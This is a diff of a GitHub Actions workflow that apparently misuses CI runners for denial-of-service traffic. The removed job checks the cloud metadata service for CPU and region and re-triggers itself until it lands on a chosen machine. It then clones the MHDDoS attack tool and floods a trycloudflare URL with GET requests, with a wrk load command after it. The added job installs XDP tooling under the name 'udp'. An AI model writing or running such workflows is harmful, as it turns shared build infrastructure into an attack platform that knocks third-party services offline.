@@ -1,24 +1,7 @@
 on: workflow_dispatch
 jobs:
-  stress:
-    runs-on: ubuntu-26.04
-    permissions:
-      actions: write
+  udp:
+    runs-on: ubuntu-26.04-arm
     steps:
-      - env:
-          GH_TOKEN: ${{ github.token }}
-        run: |
-          CPU=$(lscpu)
-          echo $CPU
-          LOCATION=$(curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance/compute/location?api-version=2017-04-02&format=text")
-          if [[ $CPU != *'AMD EPYC 9V74 80-Core Processor'* || $LOCATION != eastus ]]; then
-              gh workflow run "${{ github.workflow }}" -R "${{ github.repository }}"
-              exit 1
-          fi
-          git clone https://github.com/MatrixTM/MHDDoS.git
-          cd MHDDoS
-          pip install -r requirements.txt
-          python start.py GET http://heater-guidelines-aged-sharing.trycloudflare.com/metrics 0 1000 all.txt 1000 30 true
-          exit 1
-          sudo apt-get install -y wrk
-          wrk -t$(nproc) -c1000 -d150s http://heater-guidelines-aged-sharing.trycloudflare.com/metrics
+      - run: |
+          sudo apt-get install -y xdp-tools
